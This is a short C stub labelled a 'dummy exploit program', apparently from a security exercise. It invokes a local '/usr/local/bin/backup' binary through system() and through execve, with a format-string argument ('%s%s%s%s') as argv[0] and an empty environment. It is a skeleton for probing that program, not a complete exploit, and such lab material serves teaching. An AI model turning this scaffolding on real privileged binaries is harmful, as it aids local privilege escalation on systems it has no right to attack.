/*
 * dummy exploit program
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#define TARGET "/usr/local/bin/backup"

int main(void)
{
  char *args[2];
  char *env[1];

  // one way to invoke backup
  system("/usr/local/bin/backup backup foo");

  // another way
  args[0] = "%s%s%s%s";
  // args[1] = "restore"; 
  // args[2] = "foo";
   args[1] = NULL;

  env[0] = NULL;

  if (execve(TARGET, args, env) < 0)
    fprintf(stderr, "execve failed.\n");

  exit(0);
}
